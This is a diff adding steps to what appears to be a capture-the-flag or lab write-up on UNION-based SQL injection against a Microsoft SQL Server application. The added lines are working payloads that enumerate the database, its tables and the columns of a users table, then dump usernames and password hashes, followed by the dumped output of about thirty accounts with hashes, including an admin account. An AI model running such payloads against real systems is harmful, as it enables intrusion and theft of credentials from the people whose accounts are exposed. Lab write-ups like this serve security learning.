@@ -188,6 +188,27 @@ it is recommended to perform only basic UNION tests if there is not at least one
 ' UNION SELECT 1,@@version,3,4,5,6-- 
 ```
 
+```
+' UNION SELECT 1,DB_NAME(),3,4,5,6--
+```
+
+```
+' UNION SELECT 1,(SELECT STRING_AGG(name, ',') FROM sys.tables),3,4,5,6--
+```
+
+```
+' UNION SELECT 1,(SELECT STRING_AGG(name, ',') FROM sys.columns WHERE object_id = OBJECT_ID('users')),3,4,5,6--
+```
+
+```
+' UNION SELECT 1,(SELECT STRING_AGG(CONCAT(id,':',username,':',password,':',is_staff), ' | ') FROM users),3,4,5,6--
+```
+
+users:
+
+```
+##### 3:James :c660060492d9edcaa8332d89c99c9239 :1 | 4:Theodore :925e5408ecb67aea449373d668b7359e :1 | 5:Samantha :083ffae904143c4796e464dac33c1f7d :1 | 6:Lauren :08344b85b329d7efd611b7a7743e8a09 :1 | 7:William :d62be0dc82071bccc1322d64ec5b6c51 :1 | 8:Sabrina :f87d3c0d6c8fd686aacc6627f1f493a5 :1 | 9:Robert :f03b910e2bd0313a23fdd7575f34a694 :1 | 10:Thane :3577c47eb1e12c8ba021611e1280753c :1 | 11:Carmon :35394484d89fcfdb3c5e447fe749d213 :1 | 12:Barry :54c88b2dbd7b1a84012fabc1a4c73415 :1 | 13:Oliver :fd78db29173a5cf701bd69027cb9bf6b :1 | 14:Michelle :b83439b16f844bd6ffe35c02fe21b3c0 :1 | 15:Gloria :0cfaaaafb559f081df2befbe66686de0 :1 | 16:Victoria :b22abb47a02b52d5dfa27fb0b534f693 :1 | 17:Alexendra :1c2b3d8270321140e5153f6637d3ee53 :1 | 18:Baxter :22ee218331afd081b0dcd8115284bae3 :1 | 19:Clara :ef8f3d30a856cf166fb8215aca93e9ff :1 | 20:Barbra :3961548825e3e21df5646cafe11c6c76 :1 | 21:Lenord :ee0b8a0937abd60c2882eacb2f8dc49f :1 | 22:Austin :0049ac57646627b8d7aeaccf8b6a936f :1 | 23:Garfield :8097cedd612cc37c29db152b6e9edbd3 :1 | 24:Juliette :6dcd87740abb64edfa36d170f0d5450d :1 | 25:Victor :bf55e15b119860a6e6b5a164377da719 :1 | 26:Lucifer :7df45a9e3de3863807c026ba48e55fb3 :1 | 27:Bruno :2a4e2cf22dd8fcb45adcb91be1e22ae8 :1 | 28:Diablo :ec33265e5fc8c2f1b0c137bb7b3632b5 :1 | 29:Robin :dc332fb5576e9631c9dae83f194f8e70 :1 | 30:Stan :384463526d288edcc95fc3701e523bc7 :1 | 31:yoshihide :b779ba15cedfd22a023c4d8bcf5f2332 :1 | 33:admin :665a50ac9eaa781e4f7f04199db97a11 :0
+```
 ---
 ## Foothold
 
